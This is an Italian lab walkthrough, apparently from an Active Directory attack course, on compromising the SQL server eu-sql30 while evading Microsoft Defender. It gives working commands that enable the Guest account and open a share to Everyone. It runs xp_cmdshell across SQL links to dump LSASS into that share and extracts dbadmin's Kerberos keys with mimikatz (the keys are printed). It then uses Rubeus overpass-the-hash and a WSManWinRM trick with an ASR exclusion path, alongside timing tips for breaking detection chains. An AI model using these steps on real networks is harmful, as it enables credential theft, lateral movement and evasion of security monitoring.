# LEARNING OBJECTIVE23

* Compromise eu-sqlx again. Use opsec friendly alternatives to bypass\
  MDE and MDI.

### SVOLGIMENTO

Creare un share chiamata studentshare460, e impostare i seguenti parametri

1.  **Crea la cartella:**

    1. Apri Esplora Risorse
    2. Vai su `C:\AD\Tools` e crea una nuova cartella chiamata `studentshare460`

    <figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
2.  **Condividi la cartella:**

    1. Tasto destro sulla cartella → Proprietà
    2. Vai alla scheda "Condivisione" (Sharing)
    3. Clicca su "Share"
    4. Clicca su "Everyone e chiudi

    <figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
3. **Configura i utente guest:**
   1. Clicca su "Start" (Permissions)
   2. Digitare ComputerManagement&#x20;
   3. Clicca su Local Users and Groups&#x20;
   4. Doppio Click su Guest
   5. Rimuvere spunta da Account is Disabled&#x20;

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

```powershell
copy C:\AD\Tools\minidumpdotnet.exe \\dcorp-std460\studentshare460
```

```powershell
 copy C:\AD\Tools\FindLSASSPID.exe \\dcorp-std460\studentshare460
```

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**LSASS DUMP utilizzando Custom API**\
Successivamente, iniziare eseguendo la scansione SQL xp\_cmdshell su eu-sqlx per enumerare il PID LSASS utilizzando FindLSASSPID.exe. Avviare una sessione PowerShell utilizzando InvisiShell, importare PowerUpSQL ed eseguire il comando seguente:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
```

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-std460.dollarcorp.moneycorp.local\studentshare460\FindLSASSPID.exe''' -QueryTarget eu-sql30
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Per interrompere una catena di rilevamento, eseguiremo query innocue. Nel caso di MDE, in base alla nostra esperienza, anche attendere circa 10 minuti aiuta a evitare il rilevamento.

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql30
```

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-std460.dollarcorp.moneycorp.local\studentshare460\minidumpdotnet.exe 708 \\dcorp-std460.dollarcorp.moneycorp.local\studentshare460\monkey460.dmp ''' -QueryTarget eu-sql30
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Eseguire un'altra query benigna per sicurezza, per interrompere qualsiasi catena di rilevamento.

```powershell
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT * FROM master.dbo.sysdatabases' -QueryTarget eu-sql460
```

Tornando alla nostra studentvm, ora possiamo iniziare ad analizzare il minidump LSASS esfiltrato (monkey.dmp) utilizzando mimikatz come segue. Eseguire il comando riportato di seguito da una shell con privilegi elevati (Esegui come amministratore):

NOTA: se si verificano errori durante l'analisi del file minidump, molto probabilmente la memoria della student VM è piena. Provare a risolvere rapidamente il problema effettuando il login e il logout dalla student VM.

```powershell
C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare460\monkey460.dmp" "sekurlsa::ekeys" "exit"
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

```
Session           : Interactive from 0
User Name         : dbadmin
Domain            : EU
Logon Server      : EU-DC
Logon Time        : 1/16/2025 7:49:18 AM
SID               : S-1-5-21-3665721161-1121904292-1901483061-1105

         * Username : dbadmin
         * Domain   : EU.EUROCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f
           rc4_hmac_nt       0553b02b95f64f7a3c27b9029d105c27
           rc4_hmac_old      0553b02b95f64f7a3c27b9029d105c27
           rc4_md4           0553b02b95f64f7a3c27b9029d105c27
           rc4_hmac_nt_exp   0553b02b95f64f7a3c27b9029d105c27
           rc4_hmac_old_exp  0553b02b95f64f7a3c27b9029d105c27
```

Ora, utilizzare Overpass-the-hash sulla VM dello studente utilizzando Rubeus per avviare un processo con i privilegi dell'utente dbadmin che è membro di eu.eurocorp.local. Eseguire il comando riportato di seguito da un processo ad alta integrità sulla VM dello studente (Esegui come amministratore):

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Si noti che l'uso di winrs non viene rilevato da MDE, ma MDI (Microsoft Defender for Identity) lo rileva.

Per evitare il rilevamento, è possibile utilizzare lo strumento WSManWinRM.exe. Aggiungeremo un'esclusione ASR come “C:\Windows\ccmcache\” per evitare il rilevamento da parte della regola ASR “Blocca la creazione di processi originati dai comandi PSExec e WMI”. Eseguire il comando riportato di seguito dal processo generato come dbadmin:

NOTA: se lo strumento restituisce un valore pari a 0, si è verificato un errore nell'esecuzione del comando.

```powershell
C:\AD\Tools\WSManWinRM.exe eu-sql30.eu.eurocorp.local "cmd /c set username C:\Windows\ccmcache\"
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Per visualizzare l'output del comando, possiamo reindirizzare il comando alla VM dello studente. Questo metodo ha un successo molto limitato e stiamo continuamente cercando modi per renderlo più efficace.

```powershell
C:\AD\Tools\WSManWinRM.exe eu-sql30.eu.eurocorp.local "cmd /c dir >> \\dcorp-std460.dollarcorp.moneycorp.local\studentshare460\out.txt C:\Windows\ccmcache\"
```

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Nessun ritorno :(
